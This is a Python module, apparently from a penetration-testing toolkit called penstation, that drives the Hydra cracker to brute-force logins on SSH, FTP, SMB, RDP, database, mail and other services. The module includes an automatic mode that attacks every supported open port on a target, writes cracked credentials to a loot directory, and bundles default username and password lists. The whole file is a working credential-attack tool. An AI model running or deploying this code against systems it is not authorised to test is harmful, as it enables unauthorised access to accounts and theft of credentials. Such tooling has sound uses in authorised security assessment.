"""Brute force attack module using Hydra/Medusa."""

import asyncio
import logging
import re
from datetime import datetime
from pathlib import Path

logger = logging.getLogger("penstation.brute_force")

LOOT_DIR = Path("/home/kali/penstation/loot/bruteforce")
LOOT_DIR.mkdir(parents=True, exist_ok=True)

# Default wordlists
WORDLISTS_DIR = Path("/usr/share/wordlists")
DEFAULT_USERLIST = WORDLISTS_DIR / "seclists" / "Usernames" / "top-usernames-shortlist.txt"
DEFAULT_PASSLIST = WORDLISTS_DIR / "rockyou.txt"

# Fallback small lists bundled with penstation
BUILTIN_USERS = Path("/home/kali/penstation/wordlists/users.txt")
BUILTIN_PASSES = Path("/home/kali/penstation/wordlists/passwords.txt")

# Service definitions
SERVICES = {
    "ssh":      {"port": 22,   "hydra": "ssh"},
    "ftp":      {"port": 21,   "hydra": "ftp"},
    "telnet":   {"port": 23,   "hydra": "telnet"},
    "smb":      {"port": 445,  "hydra": "smb"},
    "rdp":      {"port": 3389, "hydra": "rdp"},
    "mysql":    {"port": 3306, "hydra": "mysql"},
    "postgres": {"port": 5432, "hydra": "postgres"},
    "vnc":      {"port": 5900, "hydra": "vnc"},
    "snmp":     {"port": 161,  "hydra": "snmp"},
    "http":     {"port": 80,   "hydra": "http-get"},
    "https":    {"port": 443,  "hydra": "https-get"},
    "smtp":     {"port": 25,   "hydra": "smtp"},
    "pop3":     {"port": 110,  "hydra": "pop3"},
    "imap":     {"port": 143,  "hydra": "imap"},
}

# Track running brute force processes
_running_jobs: dict[str, asyncio.subprocess.Process] = {}


def _get_userlist(custom: str = "") -> str:
    """Resolve userlist path. Falls back to builtin if needed."""
    if custom and Path(custom).exists():
        return custom
    if DEFAULT_USERLIST.exists():
        return str(DEFAULT_USERLIST)
    if BUILTIN_USERS.exists():
        return str(BUILTIN_USERS)
    # Create minimal fallback
    BUILTIN_USERS.parent.mkdir(parents=True, exist_ok=True)
    BUILTIN_USERS.write_text(
        "admin\nroot\nuser\ntest\nguest\nftp\n"
        "administrator\npi\nkali\nubuntu\nservice\n"
        "oracle\nmysql\npostgres\nwww-data\n"
    )
    return str(BUILTIN_USERS)


def _get_passlist(custom: str = "") -> str:
    """Resolve password list path. Falls back to builtin if needed."""
    if custom and Path(custom).exists():
        return custom
    if DEFAULT_PASSLIST.exists():
        return str(DEFAULT_PASSLIST)
    if BUILTIN_PASSES.exists():
        return str(BUILTIN_PASSES)
    # Create minimal fallback
    BUILTIN_PASSES.parent.mkdir(parents=True, exist_ok=True)
    BUILTIN_PASSES.write_text(
        "password\n123456\n12345678\nadmin\nletmein\n"
        "welcome\nmonkey\nmaster\ndragon\nlogin\n"
        "abc123\nqwerty\n111111\npassword1\n"
        "iloveyou\nsunshine\nprincess\nfootball\n"
        "shadow\n123123\n654321\ntrustno1\n"
        "toor\nroot\npi\nraspberry\nkali\n"
    )
    return str(BUILTIN_PASSES)


async def brute_force_service(
    host_ip: str,
    service: str,
    port: int = 0,
    userlist: str = "",
    passlist: str = "",
    username: str = "",
    password: str = "",
    threads: int = 4,
    timeout: int = 300,
) -> dict:
    """
    Brute force a network service using Hydra.

    Args:
        host_ip: Target host IP
        service: Service name (ssh, ftp, smb, etc.)
        port: Custom port (0 = use default)
        userlist: Path to username list
        passlist: Path to password list
        username: Single username (overrides userlist)
        password: Single password (overrides passlist)
        threads: Number of parallel threads
        timeout: Max seconds before stopping

    Returns:
        Dict with success status and found credentials
    """
    if service not in SERVICES:
        return {"success": False, "error": f"Unsupported service: {service}. Supported: {list(SERVICES.keys())}"}

    svc_info = SERVICES[service]
    target_port = port or svc_info["port"]
    hydra_svc = svc_info["hydra"]
    job_id = f"brute_{host_ip}_{service}_{target_port}"

    # Stop existing job on same target
    await stop_brute_job(job_id)

    # Build output file path
    output_file = LOOT_DIR / f"{host_ip}_{service}_{target_port}.txt"

    # Build hydra command
    cmd = ["hydra"]

    if username:
        cmd.extend(["-l", username])
    else:
        cmd.extend(["-L", _get_userlist(userlist)])

    if password:
        cmd.extend(["-p", password])
    else:
        cmd.extend(["-P", _get_passlist(passlist)])

    cmd.extend([
        "-s", str(target_port),
        "-t", str(min(threads, 16)),
        "-f",  # Stop on first valid pair
        "-V",  # Verbose
        "-o", str(output_file),
        host_ip,
        hydra_svc,
    ])

    try:
        logger.info(f"Brute force starting: {service} on {host_ip}:{target_port}")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _running_jobs[job_id] = proc

        try:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout
            )
        except asyncio.TimeoutError:
            proc.terminate()
            await asyncio.sleep(2)
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            _running_jobs.pop(job_id, None)
            return {
                "success": False,
                "job_id": job_id,
                "message": f"Brute force timed out after {timeout}s",
                "host_ip": host_ip,
                "service": service,
                "port": target_port,
                "credentials": [],
            }

        _running_jobs.pop(job_id, None)
        output = stdout.decode() + stderr.decode()

        # Parse Hydra output for successful logins
        credentials = _parse_hydra_output(output)

        logger.info(f"Brute force complete: {service}@{host_ip} — {len(credentials)} credentials found")

        return {
            "success": len(credentials) > 0,
            "job_id": job_id,
            "host_ip": host_ip,
            "service": service,
            "port": target_port,
            "credentials": credentials,
            "output": output[-1000:],
        }

    except FileNotFoundError:
        _running_jobs.pop(job_id, None)
        return {"success": False, "error": "hydra not installed. Run: sudo apt install hydra"}
    except Exception as e:
        _running_jobs.pop(job_id, None)
        logger.error(f"Brute force error: {e}")
        return {"success": False, "error": str(e)}


def _parse_hydra_output(output: str) -> list[dict]:
    """Parse Hydra output for successful logins."""
    credentials = []
    for line in output.split("\n"):
        # Hydra format: [22][ssh] host: 192.168.1.1   login: admin   password: secret
        match = re.search(
            r"\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(.*)",
            line,
        )
        if match:
            credentials.append({
                "port": int(match.group(1)),
                "service": match.group(2),
                "host": match.group(3),
                "username": match.group(4),
                "password": match.group(5).strip(),
            })
    return credentials


async def brute_force_auto(host_ip: str, open_ports: list[dict]) -> list[dict]:
    """
    Auto-detect services on open ports and brute force them.

    Args:
        host_ip: Target host IP
        open_ports: List of port dicts with 'port_number', 'service' keys

    Returns:
        List of found credentials
    """
    all_credentials = []

    # Map open ports to supported services
    port_to_service = {v["port"]: k for k, v in SERVICES.items()}

    # Also try service name matching
    service_name_map = {
        "ssh": "ssh", "ftp": "ftp", "telnet": "telnet",
        "microsoft-ds": "smb", "netbios-ssn": "smb",
        "ms-wbt-server": "rdp", "mysql": "mysql",
        "postgresql": "postgres", "vnc": "vnc",
    }

    targets = []
    for p in open_ports:
        port_num = p.get("port_number") or p.get("port", 0)
        svc_name = (p.get("service") or "").lower()

        # Try port number match first
        if port_num in port_to_service:
            targets.append((port_to_service[port_num], port_num))
        # Then service name match
        elif svc_name in service_name_map:
            targets.append((service_name_map[svc_name], port_num))

    # Deduplicate
    seen = set()
    unique_targets = []
    for svc, port in targets:
        key = f"{svc}:{port}"
        if key not in seen:
            seen.add(key)
            unique_targets.append((svc, port))

    logger.info(f"Auto brute force: {host_ip} — {len(unique_targets)} services to attack")

    for svc, port in unique_targets:
        result = await brute_force_service(host_ip, svc, port=port)
        if result.get("credentials"):
            all_credentials.extend(result["credentials"])

    return all_credentials


async def stop_brute_job(job_id: str) -> bool:
    """Stop a running brute force job."""
    proc = _running_jobs.get(job_id)
    if proc and proc.returncode is None:
        proc.terminate()
        try:
            await asyncio.wait_for(proc.communicate(), timeout=5)
        except asyncio.TimeoutError:
            proc.kill()
        _running_jobs.pop(job_id, None)
        logger.info(f"Stopped brute force job: {job_id}")
        return True
    _running_jobs.pop(job_id, None)
    return False


async def stop_all_brute_jobs() -> int:
    """Stop all running brute force jobs."""
    count = 0
    for job_id in list(_running_jobs.keys()):
        if await stop_brute_job(job_id):
            count += 1
    return count


def get_running_brute_jobs() -> list[str]:
    """Get list of running brute force job IDs."""
    return [
        jid for jid, proc in _running_jobs.items()
        if proc.returncode is None
    ]


def get_supported_services() -> dict:
    """Return supported services and their default ports."""
    return {svc: info["port"] for svc, info in SERVICES.items()}
